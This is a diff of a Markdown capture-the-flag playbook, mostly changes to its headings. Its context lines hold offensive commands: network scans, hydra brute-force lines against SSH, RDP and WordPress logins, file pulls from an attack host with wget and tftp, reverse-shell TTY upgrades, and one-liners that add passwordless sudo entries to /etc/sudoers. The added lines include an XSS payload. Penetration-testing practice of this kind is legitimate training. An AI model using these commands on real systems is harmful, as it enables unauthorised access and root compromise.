@@ -20,15 +20,49 @@ Previous Play Icon:
 - [CTF Playbook Instructions](#ctf-playbook-instructions)
 - [Index and Playsets](#index-and-playsets)
 - [Reconnaissance 1](#reconnaissance-1)
+  - [Scan Network For Targets](#scan-network-for-targets)
 - [Reconnaissance 2](#reconnaissance-2)
+  - [Simple Port Scanning Enumeration](#simple-port-scanning-enumeration)
+  - [Automated Port Scanning](#automated-port-scanning)
+  - [Port Scanning Scripts](#port-scanning-scripts)
+  - [Network Scanning](#network-scanning)
+  - [Vulnerability Scanning](#vulnerability-scanning)
 - [Reconnaissance 3](#reconnaissance-3)
+  - [Web Application Attack](#web-application-attack)
+    - [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
+    - [SQL Injection](#sql-injection)
+    - [Local File Exclusion](#local-file-exclusion)
+    - [Remote File Inclusion](#remote-file-inclusion)
+  - [Port 20 FTP](#port-20-ftp)
+  - [Port 21 FTP](#port-21-ftp)
+  - [Port 22 SSH](#port-22-ssh)
+  - [Port 23 Telnet](#port-23-telnet)
+  - [Port 25 SMTP](#port-25-smtp)
+  - [Port 43 WHOIS](#port-43-whois)
+  - [Port 53 DNS](#port-53-dns)
+  - [Port 67, 68 BOOT,DHCP](#port-67-68-bootdhcp)
+  - [Port 79 Finger](#port-79-finger)
+  - [Port 80 HTTP](#port-80-http)
+  - [Moving Fast and Breaking Things](#moving-fast-and-breaking-things)
 - [Weaponization](#weaponization)
+  - [Brute Force Services](#brute-force-services)
+  - [Malicous File Upload](#malicous-file-upload)
 - [Delivery](#delivery)
+  - [Transfer Files with TFTP](#transfer-files-with-tftp)
+  - [Transfer Files with FTP](#transfer-files-with-ftp)
+  - [Set up a Webserver to Share files,exploits](#set-up-a-webserver-to-share-filesexploits)
+  - [Upload Maliscous File](#upload-maliscous-file)
 - [Exploitation](#exploitation)
-- [Reconnaissance 4](#reconnaissance-4)
+  - [Reconnaissance](#reconnaissance)
 - [Command and GitTroll (CG2)](#command-and-gittroll-cg2)
 - [Priviledge Escalation](#priviledge-escalation)
+  - [Kicking the Tires](#kicking-the-tires)
+  - [Automated Priv Escalation Scripts](#automated-priv-escalation-scripts)
+  - [If You have a Reverse Shell...](#if-you-have-a-reverse-shell)
+  - [Metasploit](#metasploit)
+  - [Python Scripts](#python-scripts)
 - [Actions on Objectives](#actions-on-objectives)
+  - [Search for Flags](#search-for-flags)
 - [Celebration](#celebration)
 - [Non Necessities](#non-necessities)
 - [Documentation](#documentation)
@@ -47,7 +81,7 @@ Previous Play Icon:
 Locate and identify live targets on the network 
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-2)  
 
-__Scan Network For Targets__
+## Scan Network For Targets
 ``` bash
 # Use ARP protocol to find machines on the network
 arp-scan -I [interface] -l
@@ -62,7 +96,7 @@ nmap -sP [target/CIDR Range]
 Conduct network and service enumeration on targets
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-3)  
 
-__Simple Port Scanning Enumeration__
+## Simple Port Scanning Enumeration
 ``` bash 
 # Quick Nmap Scan
 nmap -T 5 [target]
@@ -77,13 +111,13 @@ nmap -sU -p- [target]
 # Nmap NSE scripting enginge for nbt service
 nmap -sU --script nbstat.nse -p 137 [target]
 ```
-__Automated Port Scanning__  
+## Automated Port Scanning  
 Port Scanning can be automated with the following tools  
 + [Sparta](https://tools.kali.org/information-gathering/sparta): Add your targets to the scope and run scans. Sparta will generate port and service enumeration, as well as web service enumeration with Nikto. Pass along services to Brute to attempt brute force attacks  
 + [OpenVas](https://tools.kali.org/vulnerability-analysis/openvas): An open source vulnerability scanner
 + [Nessus](https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux):
 
-__Port Scanning Scripts__  
+## Port Scanning Scripts  
 ```bash
 # Manually check port with ncat
 nc -nv [target] [port]
@@ -105,7 +139,7 @@ do
     done 
 ```
 
-__Network Scanning__
+## Network Scanning  
 ``` bash
 # use tcpdump to gather network traffic 
 tcpdump net [target CIDR range]
@@ -113,7 +147,7 @@ tcpdump [interface]
 tcpdump port [port]
 ```
 
-__Vulnerability Scanning__
+## Vulnerability Scanning  
 ``` bash
 # Search for public exploits
 searchsploit [any term (service, version, ect)]
@@ -144,32 +178,48 @@ ike-scan [target]
 Digging deeper into particular services, and running massive vulnerability scans. 
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#weaponization) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)  
   
-    
+## Web Application Attack  
+### Cross Site Scripting (XSS)
+```bash
+<script>alert("XSS")</script>
+```  
+### SQL Injection  
+```bash
+
+```  
+### Local File Exclusion  
+```bash
+
+```
+### Remote File Inclusion  
+```bash
+
+```  
 
 For a list of TCP and UDP ports and their common services, visit this [Wikipedia Page](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)
 
-__Port 20 FTP__  
-__Port 21 FTP__  
+## Port 20 FTP  
+## Port 21 FTP  
 ```bash
 # check for ftp vuln
 nmap -v -p 21 --script=ftp-anon.nse [target]
 ```
-__Port 22 SSH__  
-__Port 23 Telnet__  
-__Port 25 SMTP__  
+## Port 22 SSH  
+## Port 23 Telnet  
+## Port 25 SMTP  
 ```bash
 # interact with SMTP using ncat
 nc -nv [target] 25
 ```
-__Port 43 WHOIS__  
-__Port 53 DNS__  
+## Port 43 WHOIS  
+## Port 53 DNS  
 ```bash
 # use nmap to attempt zone transfer
 nmap --script=dns-zone-transfer -p 53 [domain server]
 ```
-__Port 67, 68 BOOT,DHCP__  
-__Port 79 Finger__  
-__Port 80 HTTP__  
+## Port 67, 68 BOOT,DHCP  
+## Port 79 Finger  
+## Port 80 HTTP  
 ``` bash
 firefox [target]
 firefox [target]/robots.txt
@@ -252,7 +302,7 @@ smbclient -L //[target]
 msfcli auxiliary/scanner/snmp/snmp_login RHOSTS=[target]
 ```
 
-__Moving Fast and Breaking Things__
+## Moving Fast and Breaking Things  
 ```bash 
 #!/bin/bash
 for ip in nmap -v -T5 -p[port] [host] | awk -F\
@@ -266,7 +316,7 @@ done
 Turn recon into actionable exploits
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#delivery)
 
-__Brute Force Services__
+## Brute Force Services  
 ```bash
 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 
 [target] [service] -V
@@ -292,7 +342,7 @@ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
 hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 ```
 
-__Malicous File Upload__
+## Malicous File Upload  
 ```bash
 # location of kali linux malicious web shells 
 cd /user/share/webshells/
@@ -314,7 +364,7 @@ cd /user/share/webshells/
 Deliver payload to the target, transfer files between target and attack machine.
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#exploitation)  
 
-__Transfer Files with TFTP__
+## Transfer Files with TFTP  
 ```bash
 # Start  atftpd setvice
 sudo service atftpd start
@@ -327,7 +377,7 @@ tftp [attack ip] GET filename.extension
 
 ```
 
-__Transfer Files with FTP__  
+## Transfer Files with FTP  
 ```bash
 # Set up an FTP server in Kali
 root@kali: $ mkdir /tftp
@@ -337,7 +387,7 @@ cp /file/you/want/to/share.extension /tftp/
 target@target: $ tftp -i [attack ip]get [file.extension]
 ```
 
-__Set up a Webserver to Share files,exploits__  
+## Set up a Webserver to Share files,exploits  
 ```bash
 # Set up web server in kali
 # run web server
@@ -351,7 +401,7 @@ cp /path/to/file /name.extension
 target@target: $wget http://[attack ip]/file.extension
 ```
 
-__Upload Maliscous File__
+## Upload Maliscous File  
 ```bash
 # Use the following techniques to upload malfiles such as php reverse shells
 
@@ -375,7 +425,7 @@ target$ wget [attack-machine-ip]/filename.extension
 Successful gain unauthorized access
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-4).  This step depends entirely on what type of exploit you decide to use. 
 
-# Reconnaissance 4
+## Reconnaissance   
 Gather additional information previously unattainable. Some of these will overlap with renumeration rechniques described in the [Priv Escalation Playset](#priviledge-escalation)
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#command-and-gittroll-(cg2)) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)
 
@@ -434,7 +484,7 @@ If you really wanted to test this ability. You can use [Merlin](https://github.c
 Escalate to root  . [See Credit](#credit-and-resources)
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#actions-on-objectives)  
 
-__Kicking the Tires__
+## Kicking the Tires  
 ```bash
 # Manual sudo to root
 $ sudo su -
@@ -458,7 +508,7 @@ find / -writeable > writeable-files.txt
 $ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
 
-__Automated Priv Escalation  Scripts__
+## Automated Priv Escalation  Scripts  
 Download these scripts to your target and run to search for any number of vulnerabilities  
 ```bash
 # The best script I've found by far 
@@ -468,7 +518,7 @@ wget https://github.com/pentestmonkey/unix-privesc-check
 
 ```
 
-__If You have a Reverse Shell...__
+## If You have a Reverse Shell...
 ```bash
 #Get a TTY shell after a reverse shell connection
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -513,7 +563,7 @@ __Exploiting Services__
 sys_exec('usermod -a -G admin username')
 
 ```
-__Metasploit__
+## Metasploit  
 If you have a meterpreter shell
 ``` bash
 # escalate to root
@@ -526,7 +576,7 @@ netstat
 shell
 
 ```
-__Python Scripts__
+## Python Scripts  
 ```python
 # Add sudoers
 #!/usr/bin/env python
@@ -541,7 +591,7 @@ except:
 Our object is to collect all the flags, and gain root compromise. Gather necessary CTF documentation (flags)
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#celebration)  
 
-__Search for Flags__
+## Search for Flags  
 ``` bash
 find "*flag*"
 find "*FLAG*"
